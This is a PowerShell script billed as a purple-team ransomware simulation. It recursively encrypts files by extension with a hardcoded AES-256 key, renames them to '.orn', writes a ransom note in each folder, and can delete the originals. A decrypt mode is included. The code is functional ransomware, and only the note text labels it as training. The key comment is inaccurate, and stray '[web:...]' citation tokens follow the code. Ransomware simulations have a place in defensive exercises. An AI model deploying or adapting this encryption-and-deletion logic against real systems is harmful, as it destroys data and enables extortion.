param(
    [Parameter(Mandatory=$true)]
    [string]$Path,
    
    [Parameter(Mandatory=$true)]
    [string[]]$Extensions,
    
    [switch]$Recurse,
    
    [switch]$Delete,
    
    [switch]$Decrypt
)

# Hardcoded key and IV - Purple1234567890 (32 chars for AES-256)
$KeyString = "Purple1234567890Purple1234567890Purple1234567890Pu"
$IVString = "Purple1234567890Purple"
$Key = [System.Text.Encoding]::UTF8.GetBytes($KeyString.Substring(0,32))
$IV = [System.Text.Encoding]::UTF8.GetBytes($IVString.Substring(0,16))

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $Key
$aes.IV = $IV
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

if ($Decrypt) {
    # DECRYPTION MODE
    $decryptor = $aes.CreateDecryptor()
    $files = Get-ChildItem -Path $Path -Recurse:$Recurse -File -Filter "*.orn" |
             Where-Object { $Extensions -contains $_.Name -replace '.*\.([^.]+)\.orn$','$1' }
    
    $processed = 0
    foreach ($file in $files) {
        try {
            $encryptedBytes = [System.IO.File]::ReadAllBytes($file.FullName)
            $originalBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
            
            $originalPath = $file.FullName -replace '\.orn$',''
            [System.IO.File]::WriteAllBytes($originalPath, $originalBytes)
            Remove-Item $file.FullName -Force
            
            Write-Host "DECRYPTED: $($file.Name) -> $originalPath" -ForegroundColor Cyan
            $processed++
        }
        catch {
            Write-Warning "Failed to decrypt $($file.Name): $_"
        }
    }
    
    Write-Host "Decryption complete! Restored $processed files." -ForegroundColor Green
}
else {
    # ENCRYPTION MODE
    $encryptor = $aes.CreateEncryptor()
    
    # Ransom note template
    $RansomNote = @"
=====================================
       PURPLE TEAM SIMULATION
=====================================
Your files have been ENCRYPTED for 
PURPLE TEAM TRAINING PURPOSES ONLY.

This is a CONTROLLED ransomware simulation.
No real data was compromised.

Files encrypted: *.$(($Extensions -join ', *'))
Key used: Purple1234567890 (AES-256-CBC)

To decrypt: Use same script with -Decrypt flag
Contact: Purple Team Exercise Coordinator
Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm')
=====================================
"@

    # Track folders processed for ransom notes
    $foldersProcessed = @{}

    # Find matching files
    $files = Get-ChildItem -Path $Path -Recurse:$Recurse -File | 
             Where-Object { $Extensions -contains $_.Extension.TrimStart('.') }

    $processed = 0
    foreach ($file in $files) {
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
            $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
            
            $encryptedPath = $file.FullName + ".orn"
            [System.IO.File]::WriteAllBytes($encryptedPath, $encryptedBytes)
            
            # Create ransom note in parent directory if not exists
            $parentDir = $file.Directory.FullName
            $ransomNotePath = Join-Path $parentDir "PURPLE_TEAM_RANSOM_NOTE.txt"
            if (-not $foldersProcessed.ContainsKey($parentDir) -and -not (Test-Path $ransomNotePath)) {
                $RansomNote | Out-File -FilePath $ransomNotePath -Encoding UTF8
                $foldersProcessed[$parentDir] = $true
                Write-Host "Ransom note created: $ransomNotePath" -ForegroundColor Yellow
            }
            
            if ($Delete) {
                Remove-Item $file.FullName -Force
                Write-Host "Encrypted & DELETED: $($file.Name) -> $encryptedPath" -ForegroundColor Red
            } else {
                Write-Host "Encrypted: $($file.Name) -> $encryptedPath"
            }
            $processed++
        }
        catch {
            Write-Warning "Failed to encrypt $($file.Name): $_"
        }
    }

    Write-Host "Purple Team Simulation complete!" -ForegroundColor Green
    Write-Host "Processed $processed files across $($foldersProcessed.Count) folders with ransom notes." -ForegroundColor Green
}

$aes.Dispose() [web:1][web:8][web:24]
